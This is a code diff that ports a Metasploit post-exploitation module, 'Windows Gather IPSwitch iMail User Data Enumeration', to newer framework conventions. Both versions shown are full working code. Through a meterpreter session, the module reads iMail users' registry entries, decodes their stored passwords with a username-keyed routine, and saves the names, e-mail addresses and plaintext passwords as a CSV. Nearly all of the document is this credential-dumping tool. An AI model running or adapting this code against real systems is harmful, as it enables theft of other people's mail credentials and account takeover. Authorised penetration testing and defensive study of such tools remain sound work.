@@ -1,215 +1,206 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+require 'msf/core/auxiliary/report'
 
-require 'msf/core'
-require 'msf/core/post/windows/registry'
+class MetasploitModule < Msf::Post
+  include Msf::Post::Windows::Registry
+  include Msf::Auxiliary::Report
 
-class Metasploit3 < Msf::Post
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Windows Gather IPSwitch iMail User Data Enumeration",
+      'Description'    => %q{
+          This module will collect iMail user data such as the username, domain,
+        full name, e-mail, and the decoded password.  Please note if IMAILUSER is
+        specified, the module extracts user data from all the domains found.  If
+        IMAILDOMAIN is specified, then it will extract all user data under that
+        particular category.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'sinn3r',  #Metasploit
+        ],
+      'References'     =>
+        [
+          ['EDB', '11331'],
+        ],
+      'Platform'       => [ 'win' ],
+      'SessionTypes'   => [ 'meterpreter' ]
+      ))
 
-	include Msf::Post::Windows::Registry
-	include Msf::Auxiliary::Report
+      register_options(
+        [
+          OptString.new('IMAILUSER', [false, 'iMail username', '']),
+          OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])
+        ])
+  end
 
-	def initialize(info={})
-		super(update_info(info,
-			'Name'           => "Windows Gather IPSwitch iMail User Data Enumeration",
-			'Description'    => %q{
-					This module will collect iMail user data such as the username, domain,
-				full name, e-mail, and the decoded password.  Please note if IMAILUSER is
-				specified, the module extracts user data from all the domains found.  If
-				IMAILDOMAIN is specified, then it will extract all user data under that
-				particular category.
-			},
-			'License'        => MSF_LICENSE,
-			'Version'        => "$Revision$",
-			'Author'         =>
-				[
-					'sinn3r',  #Metasploit
-				],
-			'References'     =>
-				[
-					['EDB', 11331],
-				],
-			'Platform'       => [ 'win' ],
-			'SessionTypes'   => [ 'meterpreter' ]
-			))
+  def download_info(imail_user='', imail_domain='')
+    base = "HKLM\\SOFTWARE\\Ipswitch\\IMail"
 
-			register_options(
-				[
-					OptString.new('IMAILUSER', [false, 'iMail username', '']),
-					OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])
-				], self.class)
-	end
+    #Find domain(s)
+    users_subkey = []
+    if imail_domain.empty?
+      domains_key = registry_enumkeys("#{base}\\domains")
+      if not domains_key.nil?
+        domains_key.each do |domain_key|
+          users_subkey << "#{base}\\domains\\#{domain_key}\\Users"
+        end
+      end
+    else
+      users_subkey << "#{base}\\domains\\#{imail_domain}\\Users"
+    end
 
-	def download_info(imail_user='', imail_domain='')
-		base = "HKLM\\SOFTWARE\\Ipswitch\\IMail"
+    #Find users
+    users_key = []
+    users_subkey.each do |user_key|
+      if imail_user.empty?
+        users = registry_enumkeys(user_key)
+        if not users.nil?
+          users.each do |user|
+            users_key << "#{user_key}\\#{user}"
+          end
+        end
+      else
+        users_key << "#{user_key}\\#{imail_user}"
+      end
+    end
 
-		#Find domain(s)
-		users_subkey = []
-		if imail_domain.empty?
-			domains_key = registry_enumkeys("#{base}\\domains")
-			if not domains_key.nil?
-				domains_key.each do |domain_key|
-					users_subkey << "#{base}\\domains\\#{domain_key}\\Users"
-				end
-			end
-		else
-			users_subkey << "#{base}\\domains\\#{imail_domain}\\Users"
-		end
+    #Get data for each user
+    users = []
+    users_key.each do |key|
+      #Filter out '_aliases'
+      next if key =~ /_aliases/
 
-		#Find users
-		users_key = []
-		users_subkey.each do |user_key|
-			if imail_user.empty?
-				users = registry_enumkeys(user_key)
-				if not users.nil?
-					users.each do |user|
-						users_key << "#{user_key}\\#{user}"
-					end
-				end
-			else
-				users_key << "#{user_key}\\#{imail_user}"
-			end
-		end
+      vprint_status("Grabbing key: #{key}")
 
-		#Get data for each user
-		users = []
-		users_key.each do |key|
-			#Filter out '_aliases'
-			next if key =~ /_aliases/
+      domain    = $1 if key =~ /Ipswitch\\IMail\\domains\\(.+)\\Users/
+      mail_addr = registry_getvaldata(key, 'MailAddr')
+      password  = registry_getvaldata(key, 'Password')
+      full_name = registry_getvaldata(key, 'FullName')
+      username  = $1 if mail_addr =~ /(.+)@.+/
 
-			vprint_status("Grabbing key: #{key}")
+      #Hmm, I don't think this user exists, skip to the next one
+      next if mail_addr == nil
 
-			domain    = $1 if key =~ /Ipswitch\\IMail\\domains\\(.+)\\Users/
-			mail_addr = registry_getvaldata(key, 'MailAddr')
-			password  = registry_getvaldata(key, 'Password')
-			full_name = registry_getvaldata(key, 'FullName')
-			username  = $1 if mail_addr =~ /(.+)@.+/
+      current_user =
+      {
+        :domain   => domain,
+        :fullname => full_name,
+        :username => username,
+        :email    => mail_addr,
+        :password => password,
+      }
 
-			#Hmm, I don't think this user exists, skip to the next one
-			next if mail_addr == nil
+      users << current_user
+    end
 
-			current_user =
-			{
-				:domain   => domain,
-				:fullname => full_name,
-				:username => username,
-				:email    => mail_addr,
-				:password => password,
-			}
+    return users
+  end
 
-			users << current_user
-		end
+  def decode_password(username='', enc_password='')
+    #No point trying to decode if there's no username or password
+    return "" if username.empty? or enc_password.empty?
 
-		return users
-	end
+    counter = 0
+    password = ''
 
-	def decode_password(username='', enc_password='')
-		#No point trying to decode if there's no username or password
-		return "" if username.empty? or enc_password.empty?
+    #Start decoding, what's up gold $$
+    0.step(enc_password.length-1, 2) do |i|
+      byte_1 = enc_password[i,1].unpack("C")[0]
+      byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55
+      byte_1 *= 16
 
-		counter = 0
-		password = ''
+      byte_2 = enc_password[i+1,1].unpack("C")[0]
+      byte_2 = (byte_2 <= 57) ? byte_2 - 48 : byte_2 - 55
 
-		#Start decoding, what's up gold $$
-		0.step(enc_password.length-1, 2) do |i|
-			byte_1 = enc_password[i,1].unpack("C")[0]
-			byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55
-			byte_1 *= 16
+      char = byte_1 + byte_2
 
-			byte_2 = enc_password[i+1,1].unpack("C")[0]
-			byte_2 = (byte_2 <= 57) ? byte_2 - 48 : byte_2 - 55
+      counter = 0 if username.length <= counter
 
-			char = byte_1 + byte_2
+      username_byte = username[counter, 1].unpack("C")[0]
+      if username_byte > 54 and username_byte < 90
+        username_byte += 32
+      end
 
-			counter = 0 if username.length <= counter
+      char -= username_byte
+      counter += 1
+      password << char.chr
+    end
 
-			username_byte = username[counter, 1].unpack("C")[0]
-			if username_byte > 54 and username_byte < 90
-				username_byte += 32
-			end
+    vprint_status("Password '#{enc_password}' = #{password}")
 
-			char -= username_byte
-			counter += 1
-			password << char.chr
-		end
+    return password
+  end
 
-		vprint_status("Password '#{enc_password}' = #{password}")
+  def report(users)
+    credentials = Rex::Text::Table.new(
+      'Header'  => 'Ipswitch iMail User Credentials',
+      'Indent'   => 1,
+      'Columns' =>
+      [
+        'User',
+        'Password',
+        'Domain',
+        'Full Name',
+        'E-mail'
+      ]
+    )
 
-		return password
-	end
+    users.each do |user|
+      domain    = user[:domain]
+      username  = user[:username]
+      password  = user[:password]
+      full_name = user[:fullname]
+      e_mail    = user[:email]
 
-	def report(users)
-		credentials = Rex::Ui::Text::Table.new(
-			'Header'  => 'Ipswitch iMail User Credentials',
-			'Indent'   => 1,
-			'Columns' =>
-			[
-				'User',
-				'Password',
-				'Domain',
-				'Full Name',
-				'E-mail'
-			]
-		)
+      if datastore['VERBOSE']
+        text  = ''
+        text << "User=#{username}, "
+        text << "Password=#{password}, "
+        text << "Domain=#{domain}, "
+        text << "Full Name=#{full_name}, "
+        text << "E-mail=#{e_mail}"
+        print_good(text)
+      end
 
-		users.each do |user|
-			domain    = user[:domain]
-			username  = user[:username]
-			password  = user[:password]
-			full_name = user[:fullname]
-			e_mail    = user[:email]
+      credentials << [username, password, domain, full_name, e_mail]
+    end
 
-			if datastore['VERBOSE']
-				text  = ''
-				text << "User=#{username}, "
-				text << "Password=#{password}, "
-				text << "Domain=#{domain}, "
-				text << "Full Name=#{full_name}, "
-				text << "E-mail=#{e_mail}"
-				print_good(text)
-			end
+    print_status("Storing data...")
 
-			credentials << [username, password, domain, full_name, e_mail]
-		end
+    path = store_loot(
+      'imail.user.creds',
+      'text/csv',
+      session,
+      credentials.to_csv,
+      'imail_user_creds.csv',
+      'Ipswitch iMail user credentials'
+    )
 
-		print_status("Storing data...")
+    print_status("User credentials saved in: #{path}")
+  end
 
-		path = store_loot(
-			'imail.user.creds',
-			'text/csv',
-			session,
-			credentials.to_csv,
-			'imail_user_creds.csv',
-			'Ipswitch iMail user credentials'
-		)
+  def run
+    imail_user = datastore['IMAILUSER']
+    imail_domain = datastore['IMAILDOMAIN']
 
-		print_status("User credentials saved in: #{path}")
-	end
+    vprint_status("Download iMail user information...")
 
-	def run
-		imail_user = datastore['IMAILUSER']
-		imail_domain = datastore['IMAILDOMAIN']
+    #Download user data.  If no user specified, we dump it all.
+    users = download_info(imail_user, imail_domain)
 
-		print_status("Download iMail user information...") if datastore['VERBOSE'] == false
+    #Process fullname and decode password
+    users.each do |user|
+      user[:fullname] = Rex::Text.to_ascii(user[:fullname][2, user[:fullname].length])
+      user[:password] = decode_password(user[:username], user[:password])
+    end
 
-		#Download user data.  If no user specified, we dump it all.
-		users = download_info(imail_user, imail_domain)
-
-		#Process fullname and decode password
-		users.each do |user|
-			user[:fullname] = Rex::Text.to_ascii(user[:fullname][2, user[:fullname].length])
-			user[:password] = decode_password(user[:username], user[:password])
-		end
-
-		#Report information and store it
-		report(users)
-	end
+    #Report information and store it
+    report(users)
+  end
 end
